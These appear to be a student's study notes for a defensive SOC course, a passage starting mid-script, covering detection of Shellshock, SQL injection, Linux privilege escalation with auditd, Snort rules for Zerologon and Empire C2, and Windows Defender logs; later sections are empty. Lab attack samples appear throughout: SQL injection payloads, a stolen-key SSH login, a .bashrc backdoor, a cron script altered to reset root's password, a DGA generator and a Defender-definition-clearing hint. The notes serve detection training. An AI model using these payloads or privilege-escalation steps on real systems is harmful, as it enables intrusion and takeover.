                                    print("[!] - Shellshock attempt DETECTED in %s" % log_file)
                                elif log_line[3] == '200':
                                    print("[!] - Shellshock attack  SUCCEDED in %s" % log_file)
                                    print(log_line)
```

## SQL Injection

`https://megacorpone.local/tshirts?color=purple'+UNION+SELECT+username+passwords+FROM+administrators--`

Since the statement `1=1` is always true, the application is going to return the `tshirt_id` only if it exists in the database.

`https://megacorpone.local/tshirt_model=scoop'+AND+1=1`

If the application does not return any kind of output, regardless of whether the query succeeded or not, time-based blind SQL injection can be employed as such:

`https://megacorpone.local/tshirt_model=scoop'+AND+IF(1=1,+sleep(20),+false)`


```bash
sudo truncate /var/log/apache2/*.log --size 0
```

```bash
cat /var/log/apache2/access.log
```

We have the Apache web server already preconfigured with **ModSecurity**.

**ModSecurity** offers detection and prevention capabilities against a number of different web application attack vectors and also provides the ability of increasing the log level to help with investigations.

A special file, named `modsec_audit.log`, is created to store these kinds of events.

Filter out all of the POST requests followed by the next 50 lines.

```bash
sudo cat /var/log/apache2/modsec_audit.log | awk '/-A--/,/-F--/'
```

By selectively trimming through the `awk` command the output comprised between the ModSec specific headers, `-A--` (audit log header) and `-F--` (response header), we can now spot the SQL injection payload.

```bash
sudo cat /var/log/apache2/modsec_audit.log | grep 'detected SQLi'
```

# Linux Privilege Escalation

## Becoming a User

```bash
cat /etc/passwd | grep offsec
```

This file contains information about the target account and can be viewed by any user:
- Login Name: "offsec" - Indicates the username used for login.
- Encrypted Password: "x" - This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file (more on that shortly).
- UID: "1000" - Aside from the root user that has always a UID of 0, Linux starts counting regular user IDs from 1000. This value is also called real user ID.
- GID: "1000" - Represents the user's specific Group ID.
- Comment: "offsec,,," - This field generally contains a description about the user, often simply repeating username information.
- Home Folder: "/home/offsec" - Describes the user's home directory prompted upon login.
- Login Shell: "/bin/bash" - Indicates the initial directory from which the user is prompted to login.

```bash
sudo -l
```

```bash
su bob
sudo -l
```

```bash
sudo cat /var/log/auth.log | grep "sudo:"
```

```bash
sudo cat /etc/shadow
```

```bash
sudo cat /var/log/auth.log | grep shadow
```

`python3 sudo_privesc.py`

```bash
#!/usr/bin/env python

import re
import os.path

centos_auth_log_file_path = "/var/log/secure"
ubuntu_auth_log_file_path = "/var/log/auth.log"

auth_log_files = [centos_auth_log_file_path,ubuntu_auth_log_file_path]

regex_sudo_privesc_attempt = 'sudo:.*command not allowed'

for log_file in auth_log_files:
        if os.path.isfile(log_file) :
                with open(log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(regex_sudo_privesc_attempt, line, re.S):
                            print("[*] Found 'sudo' privilege escalation attempt:\n\t"   + line,end = '')
```

Impersonate the private key's owner by connecting to localhost

```bash
ssh bob@localhost -i /home/alice/stolen_id_rsa
```

User alice successfully authenticated through password via SSH and, directly after, the user bob received a valid public-key login via SSH

No hard evidence that alice has actively used the private key to login as bob

```bash
cat /var/log/auth.log
```

`aureport` tool efficiently inspects the very detailed logs generated by the audit daemon.

When correctly configured, it can also collect any commands typed by any logged in user, thus acting like a key-logger.

Enable this feature by adding the following line to the `/etc/pam.d/sshd` configuration file.

```
session required pam_tty_audit.so enable=*
```

This line instructs the SSH authentication module to enable TTY auditing by relying on the `pam_tty_audit.so` shared library.

`enable=*` activates TTY auditing for any user on the system.

```bash
sudo systemctl restart auditd
```

The `-tty` keyword will filter for only TTY events, grouping each event by specific fields to improve readability.

```bash
sudo aureport --tty
```

Running the command with the `-tty` option outputs every keystroke pressed.

Beside the evidence of the entire `ssh bob@localhost -i /home/alice/stolen_id_rsa` command, we have visibility of the user ID that actually typed it, which is `1002`.

Confirm this is indeed the user alice:

```bash
grep alice /etc/passwd
```

Although this is helpful for gathering real evidence about a user's activities, this approach will **not scale well** in cases which only provide access to the raw audit logs.

=> Inspect the source of the logs, `auditd` logs.

Audit logs are generated by the **Linux Audit Framework**, which is comprised of a kernel module and several user-mode tools that can be combined to inspect events at the system-call level.

User commands are encoded in **hexadecimal**.

Dump the contents of `/var/log/audit/audit.log`, grepping first by "type=TTY" and then further filtering events by alice's UID.

```bash
sudo cat /var/log/audit/audit.log | grep "type=TTY" | grep " uid=1002"
```

2 hits on user's 1002 activity; both events have values in the data field.

The `data` field holds the actual keystrokes run by the user, stored in hexadecimal format.

The last hex-represented ASCII value of the string is `0D`, corresponding to to the non-printable **carriage return** character that will break `xxd` functionality if not removed.

=> Use the `sed` tool to replace any occurrence of `0D` with a printable white space value (`20`).

The `-r` option instructs `xxd` to convert values from hexadecimal to binary > Output the data in plain text format with the `-p` parameter.

```bash
echo "73736820...40D" | sed 's/0D/20/g'  | xxd -r -p
```

The script inspects each line of the `/var/log/audit/audit.log` file:

`python3 audit_decoder.py 1002`

```python
#!/usr/bin/env python

import re
import sys
import os.path
import binascii


def usage():
    print("Usage: "   + sys.argv[0] + " [uid]")
    print("Example: " + sys.argv[0] + " 1001")
    sys.exit()


def log_file_parser(uid):
        audit_log_file  = "/var/log/audit/audit.log"
        regex_audit     = "^type=TTY.*"+" uid=" + uid +".*data=.*"

        if os.path.isfile(audit_log_file) :
                with open(audit_log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(regex_audit, line, re.S):
                            print("[*] Found the following user's audit data belonging to UID:%s" % uid)
                            encoded_commands = ((line.split("data=")[1])).strip()
                            decoded_commands = (binascii.a2b_hex(encoded_commands))
                            print(decoded_commands)
                            print("---")

if __name__ == '__main__':
    if len(sys.argv) > 1:

        uid    = sys.argv[1]
        log_file_parser(uid)

    else:
        usage()
```

## Backdooring a User

2 files are responsible for executing aliases and Bash functions (`.bashrc`) and setting environmental variables (`.profile`); both are executed upon every new SSH login.

```bash
ls -asl /home/bob/.bashrc
```

```bash
echo 'echo "hello from bob .bashrc"' >> /home/bob/.bashrc
```

```bash
ssh bob@192.168.51.12
```

Run the `auditctl` command to watch (`-w`) the 2 configuration files for any write and attribute change operation (`wa`), and we'll assign the 'privesc' keyword for later look-up

```bash
sudo auditctl -w /home/bob/.bashrc  -p wa -k privesc
sudo auditctl -w /home/bob/.profile -p wa -k privesc
```

Verify that the rules are validated and in effect

```bash
sudo auditctl -l
```

Audit rules configured through auditctl will not be persistent across reboots. To make them permanent, rules have to be added to the `/etc/audit/rules.d/audit.rules` file.

Run the `aureport` tool along with the `-k` option to filter based on key value, in our case "privesc".

```bash
sudo aureport -k
```

```
1. 08/30/21 07:29:46 privesc yes /usr/sbin/auditctl 1000 232
2. 08/30/21 07:29:51 privesc yes /usr/sbin/auditctl 1000 239
3. 08/30/21 07:44:20 privesc yes /home/offsec/SOC-200/Linux_Server_Side_Attacks/Shellshock/bash-4.3/bash 1002 287
```

The first two lines of the report are referring to the `auditctl` rules we performed as the offsec user (auid `1000`).

The third event stating that the executable used to access bob's `.bashrc` is a specific version of bash.

We can also pinpoint the exact auid of the user that implanted the backdoor, which is `1002` and thus corresponds to `alice`.

To enhance analysis, the aureport tool supports the `-i` option that interprets user IDs and translates them into **usernames**.

The `auid` value is assigned every time a user logs in and it remains unchanged for the entire session, even if the user impersonates other identities (like becoming root through the `su` or `sudo` commands).

E.g., the user bob managed to elevate to superuser via a privilege escalation technique, and subsequent events are recorded in the audit logs as follows:

```bash
sudo cat /var/log/audit/audit.log
```

```
type=TTY msg=audit(1630395261.553:494): tty pid=3437 uid=0 auid=1001 ses=23 major=136 minor=0 comm="sh" data=636174202F6574632F7061737377640A
```

`python3 audit_key_search.py privesc`

```python
#!/usr/bin/env python

import re
import sys
import os.path
import binascii


def usage():
    print("Usage: "   + sys.argv[0] + " [key]")
    print("Example: " + sys.argv[0] + " privesc")
    sys.exit()


def log_file_parser(keyarg):
    audit_log_file  = "/var/log/audit/audit.log"
    regex_audit     = ".*key=\"" + keyarg +"\".*"

    if os.path.isfile(audit_log_file) :
        with open(audit_log_file, "r") as file:
            for line in file:
                for match in re.finditer(regex_audit, line, re.S):
                    print("[*] Found audit logs based on the following key: %s" % keyarg)
                    auid        = (line.split("auid=")[1]).split()[0]
                    event_type  = (line.split("type=")[1]).split()[0]
                    print("event-type: %s" % event_type)
                    print("auid: %s" % auid)
                    try:
                        exe   = (((line.split("exe=")[1])).strip()).split()[0]  
                        print("program executed: %s" % exe)               
                    except(IndexError):
                        pass
                    print("---")

if __name__ == '__main__':
    if len(sys.argv) > 1:

        keyarg    = sys.argv[1]
        log_file_parser(keyarg)

    else:
        usage()
```

## Abusing System Programs

The concept of `UID` (User ID) in relation to files and user activity.

how user identifiers are related to processes, also known as process credentials.

When a user- or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as **real UID/GID**.

The **effective UID/GID** was introduced, which represents the actual value that's being checked when performing sensitive operations.

```bash
passwd
ps u -C passwd
```

The `passwd` program is running as the `root` user: this is needed for it to access and modify the `/etc/shadow` file 

With the passwd PID (2078)

```bash
grep Uid /proc/2078/status
```

passwd behaves differently because the binary program has a special flag named Set-User-ID, or SUID 

```bash
ls -asl /usr/bin/passwd
```

The SUID flag is depicted as the s flag. This flag sets the effective UID of the running process to the executable owner's user ID, in this case root.

```bash
chmod u+s <program> 
```

Since `audit` is running at the kernel level, permanent rules cannot be disabled even by `root`, unless a reboot is performed, an event that should always trigger the incident response team.

configure audit rules to monitor root behavior (Log any activity of processes, either on x86 or x64 architectures, with effective UIDs equal to zero (root) that are also invoking the `execve` system call which is ultimately responsible for executing programs throughout a shell. We have then assigned a common `root_cmds` key for quick lookups)

```bash
sudo auditctl -a exit,always -F arch=b64 -F euid=0 -S execve -k root_cmds
sudo auditctl -a exit,always -F arch=b32 -F euid=0 -S execve -k root_cmds
```

Run the `ausearch` tool, filtering by our custom key and the executable bash. We'll also issue the `-i` option to interpret any numerical value, like UIDs, into usernames, as well as translate timestamps.

```bash
sudo ausearch -k root_cmds -i -x bash
```

Detect that the offsec user (tracked by the auid) has become root (euid) and executed the bash shell as superuser.

## Weak Permissions

```bash
ls -asl /etc/passwd
```

Multiple cron jobs can be configured on the user's own crontab through the `crontab -e` command.

Inspect preconfigured crontab for the root user

```bash
sudo crontab -l
```

`clear_history.py` Python script is scheduled to run every minute with root privileges

```python
#!/usr/bin/env python3
import os
import sys
try:
   os.system('cat /dev/null > /home/offsec/.bash_history ')
except:
    sys.exit()
```

```bash
ls -asl /home/offsec/SOC-200/Linux_Privilege_Escalation/cron_scripts/clear_history.py
```

modify the `clear_history.py` script by adding the following statement in the try block to change the root password to 'pwnd'

```bash
os.system("echo 'root:pwnd' | sudo chpasswd")
```

```bash
sudo auditctl -w /home/offsec/SOC-200/Linux_Privilege_Escalation/cron_scripts/ -p wa -k cron_scripts
```

```bash
sudo ausearch -k cron_scripts -i
```

- A PROCTITLE event containing the entire command used to modify the script through nano editor.
- 2 PATH events; one event related to the target file, and the other to the parent folder.
- A CWD event indicating that the folder from which the command was executed is alice's home folder.

```bash
python3 audit_key_search.py cron_scripts
```

A user that obtained root permissions could dump the content of the `/etc/shadow` file and try to perform an offline crack of the hashed root password in order to obtain unrestricted and unlimited access through legitimate channels, such as SSH.

The 2 audit rules that we previously configured to monitor root account activity won't serve our purpose here because only catch `execve` system calls, while dumping a file is done using either the `open` or `openat` system call.

log any write, attribute change, or read access to the file (war) and the etc_shadow look-up key.

```bash
sudo auditctl -w /etc/shadow -p war -k etc_shadow
```

retrieve the content of the shadow password file as the root user

```bash
cat /etc/shadow
```

```bash
sudo ausearch -k etc_shadow -c cat -i
```

# Network Detections

**NetFlow**: understand the activity occurring on a network (produce a metadata-only summary of the network flows.)

There are a few iterations of this mechanism based on **proprietary** tooling, such as Qflow and pFlow, 

Quickly find unusual connections (high data throughput or malicious IP addresses), but not storing any information about the packet payload.

## Intrusion Detection Systems

## Detecting Attacks 

Snort rules consist of 2 main components: the rule header and the rule options.

The rule header dictates the action to take (usually alert) and then checks any network-related data, such as the transport protocol (TCP, UDP, or ICMP), source and destination ports/IPs, and the direction of the communication.

Rule options are made by 2 sub-categories:

1. General Rule Options provides classification information

2. Detection Options implements the actual detection routine, based on a given pattern.

In order to maximize performance, we will filter the rule headers first.

In this Module lab, the snort01 machine acts as router between the 192.168.51.0/24 subnet, which simulates a public network, and the 172.16.51.0/24 subnet, which serves as a private, internal network.

A simple rule that alerts whenever ICMP traffic is detected on the local network interface Snort is listening to.

The rule below needs to be added in `/usr/local/etc/rules/local.rules` on the snort01 machine, which is already preconfigured with Snort on both network interfaces.

`alert icmp $HOME_NET any <> $EXTERNAL_NET any ( msg:"ICMP Traffic Detected"; sid:10000001; metadata:policy security-ips alert;)`

alert on ICMP traffic originating from local networks ($HOME_NET) to any external network ($EXTERNAL_NET), in a bidirectional fashion. Next, the rule options, delimited by round brackets, include the log message, the snort id, and the metadata tag.

```bash
sudo systemctl restart snort3_external
```

```bash
ping 192.168.51.40 -c 1
```

```bash
cat /var/log/snort/alert_fast.txt
```

E.g., A known vulnerability, Zerologon (CVE-2020-1472), which involves the Microsoft NETLOGON protocol and was addressed in August 2020.

This flaw, affecting the cryptographic AES-CFB8 implementation in Windows, allows an unauthenticated actor to gain domain administrator privileges by establishing a local Netlogon session.
Among the published exploits, we find that ComputeNetlogonCredential accepts an 8-byte challenge that is used to perform a cryptographic operation that returns an 8-byte result.

In order for this operation to function, a random initialization vector (IV) must be generated for each plaintext object to be encrypted with the same key. The ComputeNetlogonCredential function uses a fixed 16-byte value, which is highly guessable and subject to tampering.

`alert tcp any any -> $HOME_NET any ( msg:"OS-WINDOWS Microsoft Windows Netlogon crafted NetrServerReqChallenge elevation of privilege attempt"; flow:to_server,established; dce_iface:uuid 12345678-1234-abcd-ef00-01234567cffb; dce_opnum:"4"; content:"|04 00|",depth 2,offset 22,fast_pattern; content:"|00 00 00|",distance 0; isdataat:7,relative; isdataat:!8,relative; byte_extract:1,0,first_cc_byte,relative; byte_test:1,=,first_cc_byte,0,relative; byte_test:1,=,first_cc_byte,1,relative; byte_test:1,=,first_cc_byte,2,relative; byte_test:1,=,first_cc_byte,3,relative; detection_filter:track by_src, count 10, seconds 10; metadata:policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:dcerpc; reference:cve,2020-1472; reference:url,portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472; classtype:attempted-admin; sid:55703; rev:4; )`

`flow:to_server,established;` only inspect packets sent to the server on a previously-established TCP communication.

`dce_iface:uuid 12345678-1234-abcd-ef00-01234567cffb; dce_opnum:"4"`

The `dce_iface` rule option filters the packets based on a well-known interface, Netlogon Remote Protocol unique identifier

The `dce_opnum` filters on a specific function call, i.e. the fourth one: `NetrServerReqChallenge`.

`content:"|04 00|",depth 2,offset 22,fast_pattern`

Match (\x04\x00) at offset 22 from the packet's start of payload.

The `depth` keywords tell the Snort engine to search the specified patterns only for the first 2 bytes from the specified offset.

This pattern is going match the value "4" inside the Opnum field of the DCE/RPC header.

The `fast_pattern` option is an optimization keyword that will instruct the Snort engine to give priority to this content statement before others.

`content:"|00 00 00|",distance 0;isdataat:7,relative; isdataat:!8,relative;`

This directive starts from distance 0 and continues until it finds 3 consecutive null-bytes.

The `isdataat` keyword ensures that data exists from an offset of 7 relative to the content match and not from an offset of 8.

Detail byte-level pattern matching and comparison.

`byte_extract:1,0,first_cc_byte,relative;`

Extracts the first byte (1) at offset 0 relative to the previous content match and saves the single byte into the `first_cc_byte` variable.

Use the value saved in the variable in the following 4 directives:

```
byte_test:1,=,first_cc_byte,0,relative; 
byte_test:1,=,first_cc_byte,1,relative;
byte_test:1,=,first_cc_byte,2,relative;
byte_test:1,=,first_cc_byte,3,relative;
```

The `byte_test` operation compares the following 4 subsequent bytes to the value previously saved in `first_cc_byte` to make sure they are all equal.

The threshold that will trigger the alert.

`detection_filter:track by_src, count 10, seconds 10;`

Trigger an alert only if it matches 10 packets from the same client within 10 seconds.

```bash
cat /var/log/snort/alert_fast.txt
```

Simulate an IDS scenario where the network flows are saved into pcap files

```bash
sudo tshark -f "tcp" -i ens160 -w /home/offsec/SOC-200/Network_Detections/zerologon.pcap
```

Display Filter: `rpc_netlogon && ip.dst==172.16.51.10 && netlogon.opnum == 4`

```bash
sudo truncate -s  0 /var/log/snort/alert_fast.txt
```

filter the output to get an overview of the actual rules that have been triggered - showing only the content between the [**] and the { values and then remove any duplicate lines.

```bash
cat /var/log/snort/alert_fast.txt  | grep -o .[\*\*\].*\{ | sort -u
```

Extract the SID value located in the third field delimited by whitespaces.

```bash
cat /var/log/snort/alert_fast.txt | cut -d ':' -f 4 | sort | uniq
```

Map these SIDs into the actual rules

`python3 extract_sql_rules.py`

```python
#!/usr/bin/env python

import sys
import re
import os

snort_sql_rule_file_path = "/usr/local/etc/rules/sql.rules"

rules = os.popen("cat /var/log/snort/alert_fast.txt | cut -d ':' -f 4 | sort | uniq").read()
rules = rules.split('\n')
for rule in rules[:-1]:
    cmd = 'cat {} | grep {}'.format(snort_sql_rule_file_path,rule)
    ret = os.popen(cmd).read()
    print(ret)
```

## Detecting C2 Infrastructure

A C2 server can rely on either fixed IP or domain names in order to be reached by C2 agents.

Static IPs and domains can be quickly mapped and blocked by IPS

=> **domain flux** technique: the domain is dynamically generated by the agents at runtime through a Domain Generation Algorithm (DGA).

This kind of functionality can be embedded inside a C2 agent and customized to use any kind of input seeds to generate domains, such as custom dictionaries, prime numbers, or even other URLs.

DGA can be used by malware to set up its own C2 channel on a social media platform, like the MiniDuke malware.

`python3 dga.py 11.02.2021`

```python
import sys

def usage():
    print("Usage: "   + sys.argv[0] + " [date]")
    print("Usage: "   + sys.argv[0] + " 12.02.2021")
    sys.exit()

def generate_domain(year: int, month: int, day: int) -> str:
    domain = ""

    for i in range(0x10):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
        domain += chr(((year ^ month ^ day) % 25) + 97)

    print(domain + ".com")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        date    = sys.argv[1]
        y,m,d = date.split('.')
        generate_domain(int(y),int(m),int(d))
    else:
        usage()
```

```bash
sudo powershell-empire client
(Empire) > agents
```

```bash
sudo tshark -f "tcp port 8080" -i ens160 -w /home/offsec/SOC-200/Network_Detections/empire.pcap
```

WireShark Display Filter `http`

```bash
cat /usr/local/etc/rules/c2.rules
```

`alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:"MALWARE-CNC PowerShell Empire variant outbound connection"; flow:to_server,established; content:"/news.php HTTP/1.1|0D 0A|",fast_pattern,nocase; content:"User-Agent: Mozilla/5.0 (Windows NT 6.1|3B| WOW64|3B| Trident/7.0|3B| rv:11.0) like Gecko"; metadata:impact_flag red; service:http; reference:url,attack.mitre.org/techniques/T1086; reference:url,powershellempire.com; classtype:trojan-activity; sid:38259; rev:5; )`

Matches the beginning of the `/news.php` target URI from the beginning of the GET request, followed by the supported HTTP version, a carriage return (0x0D), and line feed (0x0A).

Matches the Empire agent's entire custom value for the `User-Agent`, including the 0x3B value to match the semicolon (;) ASCII value.

# Antivirus Alerts and Evasion

We disabled remediation with the command => no actions were performed on the file after detection.

```bat
"C:\Program Files\Windows Defender\MpCmdRun" -Scan -ScanType 3 -File C:\tools\av_alerts_evasion\signature_detect_nonstage.exe -DisableRemediation 
```

```pwsh
Start-MpScan -ScanPath C:\tools\av_alerts_evasion\signature_detect_nonstage.exe -ScanType CustomScan; Get-Date
```

`Import-Module C:\Sysmon\Get-WDLog.psm1`

```pwsh
function Get-WDLogEvent {
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-Windows Defender/Operational"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }

    Get-WinEvent -FilterHashtable $filters
}
```

Event ID 1116 is the `MALWAREPROTECTION_STATE_MALWARE_DETECTED` event 

```pwsh
Get-WDLogEvent $null "12/2/2021 10:59:00" "12/2/2021 11:00:00"
```

```pwsh
Get-WDLogEvent 1116 "12/2/2021 10:59:20" "12/2/2021 11:59:22" | Format-List
```

Retrieve a list of all threats currently awaiting mitigation

```pwsh
Get-MpThreat
```

`DidThreatExecute` field would be "True" if the detection was discovered during execution rather than a manual scan.

The `IsActive` field refers to whether Windows Defender still considers the file an active threat. Because it is enqueued for remediation, this value is set to "True".

```pwsh
Remove-MpThreat; Get-Date
```

Event 1117 reflects an action taken by Windows Defender with the symbolic name `MALWAREPROTECTION_STATE_MALWARE_ACTION_TAKEN`.

```pwsh
Get-WDLogEvent $null "12/2/2021 11:08:00" "12/2/2021 11:09:00"
```

```pwsh
Get-WDLogEvent 1117 "12/2/2021 11:08:07" "12/2/2021 11:08:09" | Format-List
```

The `Error Code` of 0 matches the Error description, confirming the operation completed successfully.

Definitions of malware and various categories are updated and stored in `%PROGRAMDATA%\Microsoft\Windows Defender\Definition Updates\Default`.

Attackers can use a command like `MpCmdRun.exe` to clear the definitions loaded into memory and render Windows Defender's concrete detections inoperable.

```bash

```

```bash

```

```bash

```

```bash

```

# Network Evasion and Tunneling



# Active Directory Enumeration



# Windows Lateral Movement



# Active Directory Persistence



# SIEM Part One: Intro to ELK

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```